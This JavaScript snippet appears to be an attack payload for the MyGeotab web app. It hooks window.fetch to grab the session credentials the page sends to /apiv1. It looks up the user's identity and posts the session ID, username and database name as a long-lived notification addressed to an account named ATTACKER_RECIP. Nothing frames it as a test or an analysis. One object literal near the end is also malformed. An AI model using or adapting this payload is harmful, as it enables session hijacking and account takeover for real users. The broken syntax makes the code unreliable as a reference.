const ATTACKER_RECIP = 'b35';
const _fetch = window.fetch;
window.fetch = function (input, init) {
  try {
    if (/apiv1/.test(typeof input === 'string' ? input : (input && input.url) || '') &&
        init && typeof init.body === 'string') {
      const c = JSON.parse(init.body).params.credentials;   
      if (c && c.sessionId) {
        window.fetch = _fetch;

        _fetch(location.origin + '/apiv1', {                
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-Application-Name': 'MyGeotab' },
          body: JSON.stringify({ method: 'GetOwnUser', params: { credentials: c } })
        }).then(r => r.json()).then(j => {
          const who = (j && j.result) || {};
          const info = JSON.stringify({
            database: c.database, userName: c.userName, sessionId: c.sessionId,
            id: who.id, name: who.name, first: who.firstName, last: who.lastName
          });
          return _fetch(location.origin + '/apiv1', {       
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-Application-Name': 'MyGeotab' },
            body: JSON.stringify({ method: 'Add', params:
              typeName: 'Notification',
              entity: {
                recipient: { id: ATTACKER_RECIP },
                dateTime: new Date().toISOString(),
                dateTimeEnd: '2099-12-31T23:59:59.999Z',
                notificationApplicationExceptionData: {
                  source: 'token', description: 'token', info: info, machineName: 'token'
                }
              },
              credentials: c } })
          });
        }).catch(e => console.log('zz', e));
      }
    }
  } catch (e) { console.log('zz', e); }
  return _fetch.apply(this, arguments);
};
